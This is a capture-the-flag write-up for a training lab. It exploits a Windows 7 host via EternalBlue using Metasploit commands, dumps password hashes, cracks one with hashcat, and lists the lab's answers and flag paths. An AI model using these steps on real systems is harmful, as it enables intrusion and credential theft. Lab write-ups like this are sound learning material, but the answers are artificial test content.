# Room: Blue 
Difficulty: Easy

## Topic: Windows Exploitation, EternalBlue (MS17-010), and Hash Cracking

## Phase 1: Reconnaissance
I began by scanning the network using nmap -sC -sV to identify open ports and service versions.

Nmap Results:
``` bash
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2026-03-10T08:05:03+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2026-03-09T07:41:59
|_Not valid after:  2026-09-08T07:41:59
|_ssl-date: 2026-03-10T08:05:50+00:00; +2s from scanner time.
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49165/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port139-TCP:V=7.95%I=7%D=3/10%Time=69AFD0A1%P=x86_64-pc-linux-gnu%r(Get
SF:Request,5,"\x83\0\0\x01\x8f");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3389-TCP:V=7.95%I=7%D=3/10%Time=69AFD0A6%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\x01\x08\0\x0
SF:2\0\0\0");
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-10T08:05:03
|_  start_date: 2026-03-10T07:41:09
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:9d:76:aa:c6:57 (unknown)
|_clock-skew: mean: 1h00m01s, deviation: 2h14m11s, median: 1s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-10T03:05:03-05:00

```
### Question 1: How many ports are open with a port number under 1000? 3 (135, 139, 445)

## Vulnerability Identified: The scan reveals the target is running Windows 7 Professional 6.1, which is vulnerable to MS17-010 (EternalBlue). This critical flaw in the SMBv1 protocol allows for Remote Code Execution (RCE)

## Phase 2: Exploitation
To exploit this vulnerability, I used Metasploit and the EternalBlue module.

Steps taken:

Load the module: 
``` bash
use exploit/windows/smb/ms17_010_eternalblue
```
Check requirements: 
``` bash
show options
```
Set the target: 
``` bash
set RHOSTS <TARGET_IP>
```
Execute: 
``` bash
exploit
```
### Question 2: What is the full path of the exploitation code? exploit/windows/smb/ms17_010_eternalblue

### Question 3: What is the name of the required value set in options? RHOSTS

## Phase 3: Password Cracking
Once I gained an elevated Meterpreter shell, I proceeded to dump the local password hashes.

Meterpreter Command:
``` bash
meterpreter > hashdump
```
Results:
``` bash
Administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon: ffb43f0de35be4d9917ac0cc8ad57f8d
```
The non-default user identified is Jon. To crack Jon's NTLM hash, I saved it to a file named jon.txt and used Hashcat with the rockyou.txt wordlist:

hashcat -m 1000 jon.txt /usr/share/wordlists/rockyou.txt

### Question 4: What is the cracked password? Alqfna22

## Phase 4: Finding the Flags
With administrative access, I navigated the file system to locate the three hidden flags.

### Question 5: Flag 1 Located at the system root: C:\flag1.txt

### Question 6: Flag 2 Located where Windows stores passwords (SAM/SYSTEM files): C:\Windows\System32\config\flag2.txt

### Question 7: Flag 3 Located in the Administrator's/User's loot directory: C:\Users\Jon\Documents\flag3.txt

## 💡 Key Takeaway
EternalBlue remains one of the most famous vulnerabilities because it targets a core Windows service (SMB). Always ensure that legacy systems are patched against MS17-010 or that SMBv1 is disabled entirely to prevent this type of attack








